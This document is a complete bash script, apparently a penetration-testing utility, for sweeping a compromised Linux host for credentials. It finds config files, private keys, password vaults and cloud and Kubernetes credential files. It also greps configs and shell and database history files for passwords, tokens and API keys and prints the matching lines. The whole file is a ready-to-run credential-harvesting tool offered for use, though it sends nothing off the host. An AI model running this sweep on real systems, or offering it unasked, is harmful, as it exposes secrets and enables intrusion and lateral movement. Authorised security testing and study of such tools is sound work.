#!/usr/bin/env bash
# juicy-files-hunt.sh — local filesystem regex sweep for credentials and ops data.
# Intended for authorized post-credential use via SSH stdin-pipe or mounted shares.
set -uo pipefail

PATHS="/etc /opt /srv /var/www /var/log /home /root /usr/local"
MAX_HITS="${JUICY_MAX_HITS:-300}"

usage() {
    cat <<EOF
Usage: $0 [--paths 'DIR DIR ...'] [--max-hits N]

Environment:
  JUICY_MAX_HITS=N       cap per grep/find section (default: $MAX_HITS)

Notes:
  - Read-only. No files are modified.
  - Best run with the privileges already granted for the engagement.
EOF
}

while [ $# -gt 0 ]; do
    case "$1" in
        --paths) PATHS="$2"; shift 2 ;;
        --max-hits) MAX_HITS="$2"; shift 2 ;;
        -h|--help) usage; exit 0 ;;
        *) echo "unknown arg: $1" >&2; usage; exit 1 ;;
    esac
done

existing_paths() {
    local p
    for p in $PATHS; do
        [ -e "$p" ] && printf '%s\n' "$p"
    done
}

mapfile -t ROOTS < <(existing_paths)
if [ "${#ROOTS[@]}" -eq 0 ]; then
    echo "[!] no readable search roots from: $PATHS"
    exit 0
fi

CRED_RE='pass(word|wd)?[[:space:]]*[=:]|secret[[:space:]]*[=:]|api[_-]?key[[:space:]]*[=:]|token[[:space:]]*[=:]|authorization:[[:space:]]*bearer|connection(string)?[[:space:]]*[=:]|aws_access_key|aws_secret|BEGIN (RSA |OPENSSH |EC |DSA )?PRIVATE KEY'
KEYBOARD_RE='qwerty|asdfgh|zxcvbn|1qaz|2wsx|qazwsx|zaq12wsx|password[0-9!@#$%^&*]*|welcome[0-9!@#$%^&*]*|spring[0-9!@#$%^&*]*|summer[0-9!@#$%^&*]*|winter[0-9!@#$%^&*]*'

echo "=== Search Roots ==="
printf '%s\n' "${ROOTS[@]}"

echo
echo "=== High-Value Filenames ==="
find "${ROOTS[@]}" -xdev -type f \( \
    -iname '*.env' -o -iname '.env' -o -iname '.env.*' -o \
    -iname 'web.config' -o -iname 'app.config' -o -iname 'appsettings*.json' -o \
    -iname 'application*.yml' -o -iname 'application*.yaml' -o -iname '*.properties' -o \
    -iname 'docker-compose*.yml' -o -iname 'compose*.yaml' -o \
    -iname '*.kdbx' -o -iname '*.rdp' -o -iname '*.ovpn' -o \
    -iname 'wp-config.php' -o -iname 'configuration.php' -o -iname 'settings.php' -o \
    -iname '*.pem' -o -iname '*.key' -o -iname '*.p12' -o -iname '*.pfx' -o \
    -iname 'id_rsa*' -o -iname 'id_ed25519*' -o -iname 'authorized_keys' -o \
    -iname 'credentials' -o -iname 'creds*' -o -iname '.npmrc' -o -iname '.netrc' -o \
    -iname 'kubeconfig' -o -iname 'config' -o -iname 'unattend.xml' -o -iname 'sysprep*.xml' -o \
    -iname 'groups.xml' -o -iname '*.service' \
    \) 2>/dev/null | head -n "$MAX_HITS"

echo
echo "=== Credential-Like Content (grep -Ilr + samples) ==="
grep -IlrE "$CRED_RE" "${ROOTS[@]}" \
    --include='*.txt' --include='*.conf' --include='*.cnf' --include='*.config' \
    --include='*.json' --include='*.yml' --include='*.yaml' --include='*.ini' \
    --include='*.xml' --include='*.env' --include='*.properties' --include='*.service' \
    --include='*.sh' --include='*.py' --include='*.rb' --include='*.js' --include='*.php' \
    2>/dev/null | head -n "$MAX_HITS" | while IFS= read -r f; do
        echo "--- $f"
        grep -Ein "$CRED_RE" "$f" 2>/dev/null | head -5
    done

echo
echo "=== Keyboard-Walk / Weak-Password Content ==="
grep -IlrE "$KEYBOARD_RE" "${ROOTS[@]}" \
    --include='*.txt' --include='*.conf' --include='*.cnf' --include='*.config' \
    --include='*.json' --include='*.yml' --include='*.yaml' --include='*.ini' \
    --include='*.xml' --include='*.env' --include='*.properties' --include='*.service' \
    --include='*.sh' --include='*.py' --include='*.rb' --include='*.js' --include='*.php' \
    2>/dev/null | head -n "$MAX_HITS" | while IFS= read -r f; do
        echo "--- $f"
        grep -Ein "$KEYBOARD_RE" "$f" 2>/dev/null | head -5
    done

echo
echo "=== Service Files With ExecStart / Credentials Context ==="
find "${ROOTS[@]}" -xdev -type f -iname '*.service' 2>/dev/null | head -n "$MAX_HITS" \
    | while IFS= read -r f; do
        if grep -qiE 'Exec(Start|Reload|Stop)|Environment(File)?=|User=|Group=' "$f" 2>/dev/null; then
            echo "--- $f"
            grep -Ein 'Exec(Start|Reload|Stop)|Environment(File)?=|User=|Group=' "$f" 2>/dev/null | head -10
        fi
    done

echo
echo "=== Shell / DB / Language History Hits ==="
for base in /root /home/*; do
    for h in .bash_history .zsh_history .mysql_history .psql_history .python_history .rediscli_history; do
        f="$base/$h"
        [ -r "$f" ] || continue
        out=$(grep -Ein "$CRED_RE|$KEYBOARD_RE" "$f" 2>/dev/null | head -10 || true)
        [ -n "$out" ] && { echo "--- $f"; echo "$out"; }
    done
done

echo
echo "=== Cloud / Kubernetes Config Presence ==="
for f in \
    /root/.aws/credentials /root/.aws/config /root/.azure/credentials \
    /root/.config/gcloud/credentials.db /root/.kube/config /var/lib/kubelet/kubeconfig \
    /home/*/.aws/credentials /home/*/.aws/config /home/*/.azure/credentials \
    /home/*/.config/gcloud/credentials.db /home/*/.kube/config; do
    [ -r "$f" ] && echo "[+] $f"
done
